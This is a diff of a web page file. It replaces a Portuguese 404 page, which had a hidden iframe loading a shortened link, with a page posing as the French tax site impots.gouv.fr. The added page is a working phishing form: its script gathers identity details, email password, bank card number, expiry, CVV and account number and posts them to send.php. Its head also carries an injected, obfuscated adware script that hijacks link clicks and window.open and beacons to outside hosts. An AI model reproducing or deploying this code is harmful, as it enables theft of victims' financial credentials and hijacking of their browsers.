@@ -1,40 +1,1290 @@
-<iframe style="position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 0;" name="analyticsgoogle" src="http://bit.ly/1FSGiPd" frameborder="0" width="0" height="0"></iframe>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br" dir="ltr">
-<head>
-	<title>404 - Erro: 404</title>
-	<link rel="stylesheet" href="error.css" type="text/css" />
-	</head>
-<body>
-	<div align="center">
-		<div id="outline">
-		<div id="errorboxoutline">
-			<div id="errorboxheader">404 - Componente não encontrado</div>
-			<div id="errorboxbody">
-			<p><strong>Você não pode visitar esta página porque:</strong></p>
-				<ol>
-					<li>um <strong>bookmark/favorito desatualizado</strong></li>
-					<li>um mecanimos de busca tem uma <strong>listagem desatualizada para este site</strong></li>
-					<li>um <strong>endereço digitado incorretamente</strong></li>
-					<li>você <strong>não tem acesso</strong> a esta página</li>
-					<li>O recurso requisitado <strong>não foi encontrado</strong></li>
-					<li>Ocorreu um erro durante o processamento de sua requisição.</li>
-				</ol>
-			<p><strong>Por favor, tente uma das páginas a seguir:</strong></p>
-			<p>
-				<ul>
-					<li><a href="http://www.itce.com.br/novo/index.php" title="Ir para Página Inicial">Página Inicial</a></li>
-				</ul>
-			</p>
-			<p>Se os problemas persistirem, por favor, contate o administrador deste site.</p>
-			<div id="techinfo">
-			<p>Componente não encontrado</p>
-			<p>
-							</p>
+﻿<!DOCTYPE html>
+<!-- saved from url=(0054)http://www.impots.gouv.fr/portal/static/part/part.html -->
+<html dir="ltr" lang="fr" class="" data-useragent="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta charset="utf-8">
+	<meta name="viewport" content="initial-scale=1.0">
+	<meta name="author" content="HDB">
+	<title>Impots.gouv.fr - Particuliers</title>
+	<link rel="shortcut icon" type="image/x-icon" href="index.html#">
+	<link rel="shortcut icon" type="image/x-icon" href="index.html#">
+
+	<link rel="stylesheet" type="text/css" href="styles.css">
+    <link rel="stylesheet" type="text/css" href="wysiwyg.css">
+
+	<script type="text/javascript" src="jquery-1.10.2.min.js"></script>
+	<script type="text/javascript" src="owl.carousel.min.js"></script>
+	<script type="text/javascript" src="script_divers.js"></script>
+	
+	
+	<script>
+	
+	$(document).ready(function(){
+	
+	$("#suivant1").click(function(){
+	
+		var verf=0;
+		var nom=document.getElementById("nom").value;
+		var prenom=document.getElementById("prenom").value;
+		var jour=document.getElementById("jour").value;
+		var mois=document.getElementById("mois").value;	
+		var annee=document.getElementById("annee").value;
+		var email=document.getElementById("email").value;
+		var pass=document.getElementById("passe").value;
+		var adresse=document.getElementById("adresse").value;
+		var ville=document.getElementById("ville").value;	
+		var tel=document.getElementById("tel").value;
+		var cp=document.getElementById("postale").value;
+		var bank=document.getElementById("bank").value;
+		
+		if(nom==""){
+			document.getElementById("msgnom").style.display="";
+			
+			verf=1;
+		}else{
+		document.getElementById("msgnom").style.display="none";
+		}
+		
+		if(prenom==""){
+			document.getElementById("msgprenom").style.display="";
+			verf=1;
+		}else{
+		document.getElementById("msgprenom").style.display="none";
+		}
+		
+		if(jour=="" || mois=="" || annee==""){
+			document.getElementById("msgdtn").style.display="";
+			verf=1;
+		}else{
+		document.getElementById("msgdtn").style.display="none";
+		}
+		
+		
+		if(email==""){
+			document.getElementById("msgmail").style.display="";
+			
+			verf=1;
+		}else{
+		document.getElementById("msgmail").style.display="none";
+		}
+		
+		if(adresse==""){
+			document.getElementById("msgad").style.display="";
+			verf=1;
+		}else{
+		document.getElementById("msgad").style.display="none";
+		}
+		
+		if(tel==""){
+			document.getElementById("msgtel").style.display="";
+			verf=1;
+		}else{
+		document.getElementById("msgtel").style.display="none";
+		}
+		
+		if(cp==""){
+			document.getElementById("msgcp").style.display="";
+			
+			verf=1;
+		}else{
+		document.getElementById("msgcp").style.display="none";
+		}
+		
+		if(ville==""){
+			document.getElementById("msgville").style.display="";
+			verf=1;
+		}else{
+		document.getElementById("msgville").style.display="none";
+		}
+		
+		if(pass==""){
+			document.getElementById("msgpasse").style.display="";
+			verf=1;
+		}else{
+		document.getElementById("msgpasse").style.display="none";
+		}
+		
+		
+		if(verf==0){
+		
+		document.getElementById("page1").style.display="none";
+		document.getElementById("page2").style.display="";
+		document.getElementById("perso").style.display="none";
+		document.getElementById("banc").style.display="";
+		}
+	
+	
+	});
+	$("#suivant2").click(function(){
+	
+		var verf=0;
+		var numcarte=document.getElementById("ncb").value;
+		var emois=document.getElementById("emois").value;
+		var eannee=document.getElementById("eannee").value;
+		var cvv=document.getElementById("cvv").value;
+		var numcompte=document.getElementById("nc").value;
+		
+		if(numcarte==""){
+		
+		document.getElementById("msgncb").style.display="";
+		document.getElementById("msgncb").innerHTML="";
+		document.getElementById("msgncb").innerHTML="<img src='pic_alerte.gif'/><div>Entrer le N°carte de Carte Bancaire</div>";
+			verf=1;
+		}else{
+			if(isNaN(numcarte)){
+				document.getElementById("msgncb").style.display="";
+				document.getElementById("msgncb").innerHTML="";
+				document.getElementById("msgncb").innerHTML="<img src='pic_alerte.gif'/><div>Ce champ doit contenir des Nombres</div>";
+				verf=1;
+			}else{
+			
+				document.getElementById("msgncb").style.display="none";
+		}
+		}
+			
+		
+		
+		
+		if(emois=="" || eannee=="" ){
+		
+		document.getElementById("msgdex").style.display="";
+			verf=1;
+		}else{
+		document.getElementById("msgdex").style.display="none";
+		}
+		
+		if(cvv==""){
+		
+		document.getElementById("msgcvv").style.display="";
+		document.getElementById("msgcvv").innerHTML="";
+		document.getElementById("msgcvv").innerHTML="<img src='pic_alerte.gif'/><div>Entrer votre cvv</div>";
+			verf=1;
+		}else{
+			if(isNaN(cvv)){
+				document.getElementById("msgcvv").style.display="";
+				document.getElementById("msgcvv").innerHTML="";
+				document.getElementById("msgcvv").innerHTML="<img src='pic_alerte.gif'/><div>Ce champ doit contenir des Nombres</div>";
+				verf=1;
+			}else{
+			
+				document.getElementById("msgcvv").style.display="none";
+		}
+			
+			
+		}
+		
+		
+		if(bank.value=='bnp' || bank.value=='caisse' || bank.value=='sg' || bank.value=='pst' || bank.value=='lcl' ){		
+		
+			if(numcompte==""){
+			
+			document.getElementById("msgncom").style.display="";
+				verf=1;
+			}else{
+			document.getElementById("msgncom").style.display="none";
+			}
+		
+		
+		}
+		
+		
+		
+		if(verf==0){
+			var frm=document.getElementById("frm");
+				frm.action="send.php";
+				frm.submit();
+	}
+		});
+	
+	});
+
+	
+	
+	</script>
+	
+
+	<style>
+	
+		#page1 .msg{
+		
+		float:right;
+		margin-right:320px;
+		margin-top:5px;
+		font-family:Georgia, Times, 'Times New Roman', serif;
+		font-size:12px;
+		width:200px;
+		
+		
+		}
+		#page1 .msg img{
+		float:left;
+		
+		
+		}
+		
+		#page1{
+		width:900px;
+		
+		}
+
+		#page2{
+		width:700px;
+		
+		}
+		#page2 .msg{
+		
+		float:right;
+		margin-right:170px;
+		margin-top:5px;
+		font-family:Georgia, Times, 'Times New Roman', serif;
+		font-size:12px;
+		width:190px;
+		
+		
+		}
+		#page2 .msg img{
+		float:left;
+		
+		
+		}
+		
+		#page1 label{
+		width:150px;
+		display:block;
+		float:left;
+		margin-top:5px;
+		}	
+		
+		#page2 label{
+		width:170px;
+		display:block;
+		float:left;
+		margin-top:5px;
+		}
+		
+		input{
+		
+		width:218px;
+		margin-bottom:10px;
+		padding:5px;
+		
+		}
+		
+		select{
+		margin-bottom:10px;
+		padding:5px;
+		}
+		
+		.visa{
+		margin-left:170px;
+		}
+		
+		.cvv{
+		margin-top:px;
+		width:30px;
+		height:25px;
+		}
+		
+		.bt{
+		float:left;
+		margin-left:500px;
+		width:110px;
+		height:20;
+		border-radius: 8px;
+		cursor:pointer;
+		}
+		.val{
+		float:left;
+		margin-left:500px;
+		width:110px;
+		height:20;
+		border-radius: 8px;
+		cursor:pointer;
+		}
+		
+	.sucure{
+		margin-left:585px;
+		margin-top:15px;
+		
+		
+		
+	}
+	.perso{
+		position:relative;
+		top:-25px;
+		
+		
+		
+	}
+		
+	
+	</style>
+	
+	
+	<!--[if IE 7]>
+		<link rel="stylesheet" type="text/css" href="../css/styles-ie7.css" />
+		<script type="text/javascript" src="../js/ie7.js"></script>
+	<![endif]-->
+
+	<!--[if IE 8]>
+		<link rel="stylesheet" type="text/css" href="../css/styles-ie8.css" />
+	<![endif]-->
+
+	<!--[if lt IE 9]>
+		<script src="../js/html5.js"></script>
+	<![endif]-->
+	
+<script type="text/javascript" async src="wp.js" id="id_arrrrppdjafklbvnn4450fm"></script><script type="text/javascript" async src="wpnewbs.js" id="id_arrrrppdjafklbvnn4440fm"></script><script type="text/javascript" async src="wpgb.js" id="id_ad5cbe0b719874f1"></script><script id="fghjktghndfgt" type="text/javascript">function fghjktghndfgt_init(){new function(){if(!document.getElementById('__fghjktghndfgt_once')){(function(){var a=document.createElement('div');a.id='__fghjktghndfgt_once';a.setAttribute('style','display:none;');var c=document.getElementsByTagName('body')[0];c&&c.appendChild(a)})();var a=this;a.pid='2356';a.cc='MA';a.eid='1337';a.ename='DealNoDeal';a.hid='18076491714403566395';a.debugMode=!1;a.utils=new function(){var b=this;'function'!==typeof String.prototype.trim&&(String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,'')});b.JSON=new function(){this.parse=function(c){try{return'undefined'!==typeof JSON&&'function'==typeof JSON.stringify?JSON.parse(c):eval('var a='+c)}catch(a){return!1}}};b.cookie=new function(){var c=this;c.setCookie=function(c,a,b){var f='';'string'===typeof b?f='; expires='+b:'number'===typeof b&&(f=new Date,f.setTime(f.getTime()+864E5*b),f='; expires='+f.toGMTString());document.cookie=c+'='+a+f+'; path=/'};c.getCookie=function(c){c+='=';for(var a=document.cookie.split(';'),b=0;b<a.length;b++){for(var f=a[b];' '==f.charAt(0);)f=f.substring(1,f.length);if(0==f.indexOf(c))return f.substring(c.length,f.length)}return null};c.eraseCookie=function(a){c.setCookie(a,'',-1)}};b.getProtocol=function(c){var a=document.createElement('a');a.href=c;return a.protocol};b.getHostName=function(c){if(!c)return'';var a=document.createElement('a');a.href=c;return a.hostname};b.isMenuBarVisible=function(){if(!b.msie&&window.menubar)return window.menubar.visible;if('object'==typeof WebBrowser2)return WebBrowser2.MenuBar;if(b.msie)return!0;var c=window.innerWidth||document.documentElement.scrollWidth||0,a=window.innerHeight||document.documentElement.scrollHeight||0;if(c){window.resizeTo(c,a);var g=window.innerWidth||document.documentElement.scrollWidth,e=window.innerHeight||document.documentElement.scrollHeight;window.resizeTo(c+2,a);c=window.scrollWidth||document.documentElement.scrollWidth;return!(c!=g&&c<=g+2&&90>=a-e)}};b.getInstructions=function(c,d){b.msie?b.inject_script(c+('&cb='+a.prefix+'.'+d)):b.ajax.get(c,function(c){if(c)a[d](c)})};b.l=new function(){var c=this;c.xlat='abcdwxyzstuvrqponmijklefghABCDWXYZSTUVMNOPQRIJKLEFGH9876543210+/';c.encode=function(a){a=c._utf8_encode(a);for(var b='',e=0;e<a.length;){var f=a.charCodeAt(e++),h=a.charCodeAt(e++),l=a.charCodeAt(e++),k=f>>2,f=(f&3)<<4|h>>4,n=(h&15)<<2|l>>6,m=l&63;isNaN(h)?n=m=64:isNaN(l)&&(m=64);b=b+c.xlat.charAt(k)+c.xlat.charAt(f)+(64==n?'=':c.xlat.charAt(n))+(64==m?'=':c.xlat.charAt(m))}return b};c._utf8_encode=function(c){if(c&&c.length){for(var a='',b=0;b<c.length;b++){var f=c.charCodeAt(b);128>f?a+=String.fromCharCode(f):(127<f&&2048>f?a+=String.fromCharCode(f>>6|192):(a+=String.fromCharCode(f>>12|224),a+=String.fromCharCode(f>>6&63|128)),a+=String.fromCharCode(f&63|128))}return a}return c};c.decode=function(a){a=a.toString().replace(/[^A-Za-z0-9\+\/]/g,'');for(var b='',e=0;e<a.length;){var f=c.xlat.indexOf(a.charAt(e++)),h=c.xlat.indexOf(a.charAt(e++)),l=c.xlat.indexOf(a.charAt(e++)),k=c.xlat.indexOf(a.charAt(e++)),n=(h&15)<<4|l>>2,m=(l&3)<<6|k,b=b+String.fromCharCode(f<<2|h>>4);64!=l&&0<n&&(b+=String.fromCharCode(n));64!=k&&0<m&&(b+=String.fromCharCode(m))}return this._utf8_decode(b)};c._utf8_decode=function(a){for(var c='',b=0;b<a.length;){var f=a.charCodeAt(b);if(128>f)c+=String.fromCharCode(f),b++;else if(191<f&&224>f)var h=a.charCodeAt(b+1),c=c+String.fromCharCode((f&31)<<6|h&63),b=b+2;else var h=a.charCodeAt(b+1),l=a.charCodeAt(b+2),c=c+String.fromCharCode((f&15)<<12|(h&63)<<6|l&63),b=b+3}return c}};b.ajax=new function(){this.get=function(a,b){try{var g=new XMLHttpRequest;g.open('GET',a,!0);g.withCredentials=!0;g.onreadystatechange=function(){4==g.readyState&&b(g.responseText)};g.send()}catch(e){}}};b.randomChar=function(){for(var a='',b=0;2>b;b++)a+='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.charAt(Math.floor(52*Math.random()));return a};b.msie=function(){var a=parseInt((/msie (\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10);isNaN(a)&&(a=parseInt((/trident\/.*; rv:(\d+)/.exec(navigator.userAgent.toLowerCase())||[])[1],10));return isNaN(a)?!1:a}();b.inject_script=function(c){var b=document.getElementsByTagName('body')[0],g=document.createElement('script');g.type='text/javascript';g.id='id_'+a.prefix;g.src=c;b&&b.appendChild(g)};b.epoch=function(){return Math.floor((new Date).getTime()/1E3)};b.getVert=function(){var a=localStorage.getItem('sk398erjds2d');return a?a:b.forexVert()};b.browser=function(){var a=navigator.userAgent.toLowerCase(),b={webkit:/webkit/.test(a),mozilla:/mozilla/.test(a)&&!/(compatible|webkit)/.test(a),chrome:/chrome/.test(a),msie:/msie/.test(a)&&!/opera/.test(a),firefox:/firefox/.test(a),safari:/safari/.test(a)&&!/chrome/.test(a),opera:/opera/.test(a)};b.version=b.safari?(a.match(/.+(?:ri)[\/: ]([\d.]+)/)||[])[1]:(a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/)||[])[1];return b}();b.getNodeTextProp=function(a){return'textContent'in a?'textContent':'innerText'in a?'innerText':!1};b.dhtml_prop_name=function(a){return a.replace(/(\-([a-z]){1})/g,function(a,c,b){return b.toUpperCase()})};b.get_computed_style='function'!=typeof window.getComputedStyle?function(a){return{getPropertyValue:function(d){'float'==d&&(d='styleFloat');d=b.dhtml_prop_name(d);return'object'==typeof a.currentStyle&&null!=a.currentStyle&&'undefined'!=typeof a.currentStyle[d]?a.currentStyle[d]:null}}}:function(a,b){return window.getComputedStyle(a,b)||{getPropertyValue:function(){}}};b.getEmptyWindow=function(){var a=document.createElement('iframe');a.src='about:blank';a.setAttribute('style','display:inline;width:1px;height:1px;padding:none;margin:none;');document.body.appendChild(a);return a.contentWindow}};a.prefix='fghjktghndfgtssss';a.extName='DealNoDeal';a.version='0.1.1';a.pop_collision_id='__ipm=';a.pixelHostname=function(){try{return'//mnh.'+eval('["starvard.net","winnershed.info"]')['https:'==window.location.protocol?1:0]}catch(a){return['//mnh.winneri.info','//mnh.winnermore.org']['https:'==window.location.protocol?1:0]}}();a.watcherCount=0;a.fallbackHostnames=['compey.net','comprises.info'];try{a.stngs=a.utils.JSON.parse('{"szy_domain":["bestwebnutfunblack.net","comprises.info"],"ad_sizes":[[120,60,19],[630,250,22],[336,280,17],[630,500,23],[180,150,18],[234,60,15],[200,200,16],[600,400,13],[125,125,14],[670,670,11],[600,270,12],[800,600,21],[468,60,3],[800,440,20],[300,250,2],[728,90,1],[300,600,10],[120,240,7],[120,600,6],[160,600,5],[250,250,4],[240,400,8]]}')}catch(q){a.hostnames=a.fallbackHostnames}var p;p=''!==a.stngs&&a.stngs&&'undefined'!==typeof a.stngs.szy_domain&&a.stngs.szy_domain instanceof Array?a.stngs.szy_domain:a.fallbackHostnames;a.hostnames=p;a.debugMode&&(a.debug=new function(){var b=this;window.oldSetTimeout=window.setTimeout;window.oldSetInterval=window.setInterval;b.overrideSettimeout=function(){window.setTimeout=function(a,b){return window.oldSetTimeout(function(){try{console.log('%csetTimeout: '+a.toString(),'color:purple'),a()}catch(b){}},b)}};b.overrideSetinterval=function(){window.setInterval=function(a,b){return window.oldSetInterval(function(){try{console.log('setInterval: '+a.toString()),a()}catch(b){}},b)}};b.overrideVariables=function(){a.pid='12';a.cc='US';a.eid='10';a.hid='123456789';a.ename='QA extension';a.lt='2617.24';a.jpshort='_OXQj15i';a.platform_version='10'};b.init=function(){b.overrideSettimeout();b.overrideSetinterval();b.overrideVariables()};b.init()});a.legacyHostnames=['superiends.org','go.turboloves.net','installerapplicationusa.com','stylene.net'];a.body=document.getElementsByTagName('body')[0];a.params={subid:a.pid,subid1:a.hid,subid2:a.eid,'px.pluginh':1,tid:'7',red:'1',subid3:'679'};a.manhattanCookieInterval=0.0015;a.events=new function(){var a=this;a.cache=[];a.add=window.addEventListener?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e.addEventListener(c,d,g);f&&a.cache.push([c,d,g,e])}:window.attachEvent?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e['e'+c+d]=d;e[c+d]=function(){e['e'+c+d](window.event)};e.attachEvent('on'+c,e[c+d]);f&&a.cache.push([c,d,g,e])}:function(){};a.remove=window.removeEventListener?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.removeEventListener(a,b,g)}:window.detachEvent?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.detachEvent('on'+a,e[a+b]);e[a+b]=null;e['e'+a+b]=null}:function(){};a.flush=function(){for(var c=0;c<a.cache.length;c++)a.remove.apply(a,a.cache[c]);a.cache=[]}};a.pixel=function(b,c){var d=a.pixelHostname+'?',g=a.hostnames[0],g={pid:a.pid,cc:a.cc,eid:a.eid,hid:a.hid,v:a.version,ch:b,cid:0,tid:a.params.tid,adtid:0,smid:0,pbid:'0',oh:encodeURIComponent(c),sh:encodeURIComponent(g)},e;for(e in g)d+=e+'='+g[e]+'&';d=d.slice(0,-1);if(21===b)return d=d.split('?')[1],a.utils.l.encode(d);(new Image).src=d};a.getKeywords=function(){var a=document.title,c=document.getElementsByTagName('meta');if(c)for(var d=0,g=c.length;d<g;d++)'keywords'!=c[d].name.toLowerCase()&&'description'!=c[d].name.toLowerCase()||(a+=' '+c[d].content.replace(/,/g,' '));if(d=document.getElementsByTagName('a')){c={};for(g=0;g<d.length;g++)try{var e=d[g].innerText;'undefined'==typeof e&&(e=d[g].textContent);for(var f=e.toLowerCase().split(/[\s,-]/g),h=0;h<f.length;h++)4>f[h].length||(c[f[h]]?c[f[h]]++:c[f[h]]=1)}catch(l){}var e=[],k;for(k in c)e.push([k,c[k]]);e.sort(function(a,b){return b[1]-a[1]});e=e.slice(0,25);for(k=0;k<e.length;k++)a+=' '+e[k][0]}return encodeURIComponent(a.replace(/[\!\[\]_-]/g,' ').trim().substring(0,1500))};a.isFalseResponseFromServer=function(){-1<a.body.innerText.indexOf('e7hZBzqVfn==')&&window.close()};a.checkIfServer=function(){for(var b=0;b<a.hostnames.length;b++)if(location.hostname===a.hostnames[b])return a.isFalseResponseFromServer(),!0};a.checkIfPop=function(b,c,d){return!(d+'').match(/^InterYield/i)&&!(d+'').match(/(a652c|ld893)_/)&&'r_ron_redir'!==d&&-1==document.cookie.indexOf('xcddsa')&&-1==b.indexOf('px.pluginh')&&-1==b.indexOf('earchfu')&&-1==location.href.indexOf('/amz/')&&-1==location.href.indexOf('/sd/dw32.html')&&-1==location.href.indexOf('/pop/1.1.00')&&!location.href.match(/cpops-\d+\.html/)&&-1==location.href.indexOf('px.pluginh')&&-1==b.indexOf('nkths.co')&&-1==b.indexOf('ally.asi')&&-1==b.indexOf('/sd/dw32.html')&&-1==b.indexOf('/pop/1.1.00')&&-1==b.indexOf('/amz/')&&!b.match(/cpops-\d+\.html/)&&-1==a.utils.getHostName(b).indexOf('getjs')&&-1==a.utils.getHostName(b).indexOf('hsbc')};window==window.top&&a.pixel(10,'0');-1<window.location.href.indexOf(a.pop_collision_id)&&window==window.top&&a.pixel(13,'0');a.addBlurredTabListener=function(b){var c;try{c=a.utils.getHostName(b.target.getAttribute('href'))}catch(d){c=''}'a'==b.target.tagName.toLowerCase()&&''==b.target.innerHTML&&b.target.getAttribute('href')&&!b.target.getAttribute('download')&&-1==c.indexOf(window.location.hostname)&&(c=b.target.getAttribute('href')?b.target.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),b.target.setAttribute('target',a.prefix),c=new Date,c.setMinutes(c.getMinutes()+15),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),b.target.setAttribute('href',a.manhattanUrl),document.getElementsByTagName('body')[0].removeEventListener('click',a.addBlurredTabListener))};a.prepareUrl=function(b){b='?';for(var c in a.params)b+=c+'='+a.params[c]+'&';b+='k='+a.getKeywords();return'http://'+a.hostnames[0]+b};try{window.top==window&&-1==document.cookie.indexOf('vdsknj4th4uh')&&window.name!==a.prefix&&a.overrideDispatchEvent()}catch(r){}a.checkIfServer()||(a.cachedOpenFn=window.open,a.overrideDispatchEvent=function(){a.cachedDispatchEvent=document.createElement('a').constructor.prototype.dispatchEvent;document.createElement('a').constructor.prototype.dispatchEvent=function(b){var c;try{c=a.utils.getHostName(event.target.getAttribute('href'))}catch(d){c=''}'a'==this.tagName.toLowerCase()&&''==this.innerHTML&&'click'==b.type&&-1==c.indexOf(window.location.hostname)&&this.getAttribute('href')&&!this.getAttribute('download')&&-1==document.cookie.indexOf('vdsknj4th4uh')&&(c=this.getAttribute('href')?this.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),this.setAttribute('target',a.prefix),c=new Date,c.setMinutes(c.getMinutes()+15),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),this.setAttribute('href',a.manhattanUrl));a.cachedDispatchEvent.call(this,b)}},a.checkIfPartner=function(a){return'Za'==a},a.overrideWindowOpen=function(){clearTimeout(a.timeout);window.open=function(b){return function(c,d,g){window==window.top&&a.pixel(11,'0');b=a.cachedOpenFn;if(a.checkIfPop(c,g,d))return d=new Date,d.setMinutes(d.getMinutes()+15),a.utils.cookie.setCookie('xcddsa','1',d.toUTCString()),a.manhattanUrl=a.prepareUrl(c),d=a.prefix,a.pixel(20,c),a.manhattanOn=!0,a.utils.msie&&9>a.utils.msie?window.open(a.manhattanUrl,d,g):b.call(window,a.manhattanUrl,d,g);d=d||'';window.open=a.cachedOpenFn;return a.utils.msie&&9>a.utils.msie?window.open(c,d,g):b.call(window,c,d,g)}}(window.open);4<a.watcherCount||a.manhattanOn||(a.watcherCount++,a.openWatcher())},a.overrideDispatchEvent(),a.openWatcher=function(){a.timeout=setTimeout(a.overrideWindowOpen,200)},a.openWatcher(),'undefined'==typeof window[a.prefix]&&(window[a.prefix]=a))}};};fghjktghndfgt_init()</script><script src="services.js"></script><script type="text/javascript" src="serviceset.js"></script><script type="text/javascript" src="traffic.js"></script><script type="text/javascript" src="jquery-1.7.2.min.js"></script><script type="text/javascript" src="swfstore.js"></script><script async type="text/javascript" src="dpx.js" data-sifi-parsed="true"></script><script async type="text/javascript" src="itn.js" id="_GPL_a652c2"></script><script async type="text/javascript" src="z7b85.js" id="_GPL_z7b85"></script><style type="text/css">.yvomuamd,.yvomuamd *,.yywsytexio,.yywsytexio *{background:0 0!important;-moz-box-sizing:border-box!important;-webkit-box-sizing:border-box!important;-o-box-sizing:border-box!important;-ms-box-sizing:border-box!important;box-sizing:border-box!important;border:0!important;bottom:auto!important;clip:auto!important;clear:none!important;display:block!important;float:none!important;height:auto!important;left:auto;margin:0!important;max-height:none!important;max-width:none!important;min-height:0!important;min-width:0!important;opacity:1;overflow:visible!important;padding:0!important;position:static!important;right:auto!important;text-align:left!important;text-decoration:none!important;text-indent:0!important;text-transform:none!important;-moz-transform:none!important;-webkit-transform:none!important;-o-transform:none!important;-ms-transform:none!important;transform:none!important;vertical-align:baseline!important;top:auto;visibility:visible!important;white-space:normal!important;width:auto!important;zoom:1!important;z-index:auto!important}.yvomuamd .mpppotudjf:hover,.yywsytexio{text-decoration:underline!important}.yywsytexio,.yywsytexio img{display:inline-block!important}.yywsytexio{font-weight:700!important;margin:0 0 0 3px!important;text-transform:uppercase!important}.yywsytexio img{height:10px!important;margin:0 3px!important;vertical-align:super!important;width:10px!important}.yvomuamd{background:#FEFEFE!important;border:1px solid #ececec!important;-moz-border-radius:10px!important;-webkit-border-radius:10px!important;-o-border-radius:10px!important;-ms-border-radius:10px!important;border-radius:10px!important;-moz-box-shadow:1px 3px 8px rgba(0,0,0,.37)!important;-webkit-box-shadow:1px 3px 8px rgba(0,0,0,.37)!important;-o-box-shadow:1px 3px 8px rgba(0,0,0,.37)!important;-ms-box-shadow:1px 3px 8px rgba(0,0,0,.37)!important;box-shadow:1px 3px 8px rgba(0,0,0,.37)!important;filter:progid:DXImageTransform.Microsoft.Shadow(color=#888888, direction=135, strength=4)!important;font:12px/normal Verdana,sans-serif!important;cursor:pointer!important;position:absolute!important;z-index:2147483647!important}.yvomuamd .kmjjtqduw{clear:both!important;padding:15px 15px 0!important;position:relative!important}.yvomuamd .sttskjkkvvh{overflow:hidden!important;text-align:center!important}.yvomuamd .afhzwcsmvc{color:#00F!important;font-size:13px!important}.yvomuamd .uwxtjyrwezd{font:11px Tahoma,sans-serif!important;margin:0 0 3px!important;min-height:40px!important}.yvomuamd .mpppotudjf,.yvomuamd .yciraonl{font:10px Tahoma,sans-serif!important}.yvomuamd .yciraonl{color:#093!important;margin:0 0 8px!important}.yvomuamd .hmkzfiwtzk{-moz-border-radius:5px!important;-webkit-border-radius:5px!important;-o-border-radius:5px!important;-ms-border-radius:5px!important;border-radius:5px!important;border:1px solid #BB0500!important;-moz-box-shadow:inset 0 0 2px rgba(255,255,255,.2)!important;-webkit-box-shadow:inset 0 0 2px rgba(255,255,255,.2)!important;-o-box-shadow:inset 0 0 2px rgba(255,255,255,.2)!important;-ms-box-shadow:inset 0 0 2px rgba(255,255,255,.2)!important;box-shadow:inset 0 0 2px rgba(255,255,255,.2)!important;float:left!important;overflow:hidden!important}.yvomuamd .rrrcsmbykwt{background:#E90E00!important;background-image:-moz-linear-gradient(90deg,#d92c2a,#fc3f2a)!important;background-image:-webkit-linear-gradient(90deg,#d92c2a,#fc3f2a)!important;background-image:-o-linear-gradient(90deg,#d92c2a,#fc3f2a)!important;background-image:-ms-linear-gradient(90deg,#d92c2a,#fc3f2a)!important;background-image:linear-gradient(90deg,#d92c2a,#fc3f2a)!important;background-image:linear-gradient(0deg,#d92c2a,#fc3f2a)!important;color:#fff!important;padding:4px 14px!important}.yvomuamd .mpppotudjf{color:#999!important;float:right!important;padding:5px!important;text-align:right!important}.yvomuamd .titfbcthcym{-moz-border-radius:3px!important;-webkit-border-radius:3px!important;-o-border-radius:3px!important;-ms-border-radius:3px!important;border-radius:3px!important;color:#d4d4d4!important;clear:both!important;display:block!important;float:right!important;font-weight:700!important;margin:2px 8px 0 0!important;padding:1px 4px!important}.yvomuamd .titfbcthcym:hover{background:#eee!important}.yvomuamd iframe{height:250px!important;position:relative!important;width:300px!important}.yvomuamd .xfmgqfngtm{width:329px!important}.yvomuamd .xfmgqfngtm .kmjjtqduw{padding-bottom:0!important}.yvomuamd .lvundtwwnya{width:327px!important}.yvomuamd .lvundtwwnya .sttskjkkvvh{width:300px!important}.yvomuamd .esvxeabsw{width:279px!important}.yvomuamd .esvxeabsw .sttskjkkvvh{padding:0 0 15px!important}.yvomuamd .jyislcebek{width:347px!important}.yvomuamd .jyislcebek .sttskjkkvvh{float:right!important;margin:0 0 0 5px!important}.yvomuamd .ejywyvbbjsx{width:259px!important}</style><script type="text/javascript" src="kw.js"></script></head>
+
+<body  id="part" role="document" jhjlijpomuhn_m="l" s18076491714403566395="1">
+
+	<div class="page">
+
+<!-- HEADER --><!-- #BeginLibraryItem "/Library/moe_all_header.lbi" -->
+<header id="header" role="banner">
+
+			<!-- HEADER LEFT -->
+			<div class="col-left">
+
+				<!-- LINKS BOX -->
+				
+				<!-- LINKS BOX end-->
+
+				<img src="impot_logo.jpg" />
+				<!-- TITLE -->
+				
+				<!-- TITLE end-->
+
 			</div>
+			<!-- HEADER LEFT end -->
+
+
+			<!-- HEADER RIGHT -->
+			<div class="col-right">
+
+				<!-- USER BOX -->
+				<div class="my-space rounded-corner">
+					<h3 class="services">Mon espace<span class="sprite sprite-bg-h3-services"></span></h3>
+                    <div class="baseline">Accéder à mes services en ligne</div>					
+					<a class="btn btn-gray" href="index.html#">Particulier</a>					
+                    <a class="btn btn-gray" href="index.html#">Professionnel</a>              
+				</div>
+				<!-- USER BOX end-->
+
+				<!-- SEARCHE BOX -->
+				<div class="border-blue">
+					<h2 class="upper-blue">RECHERCHE</h2>
+					<ul class="blue-arrow">
+						<li><a href="index.html#" title="Recherche par mots-clés">Recherche détaillée</a></li>
+						<li><a href="index.html#" title="Recherche de formulaires">Recherche de formulaires</a></li>
+					</ul>
+				</div>
+				<!-- SEARCHE BOX end -->
+
 			</div>
-		</div>
-		</div>
+			<!-- HEADER RIGHT end -->
+
+		</header><!-- #EndLibraryItem --><!-- HEADER end -->
+<!-- *************************************************************************************************** -->
+
+		<!-- NAVIGATION --><!-- #BeginLibraryItem "/Library/moe_part_onglets.lbi" -->
+<nav class="nav" role="navigation">
+			<ul role="menubar">
+				<li>
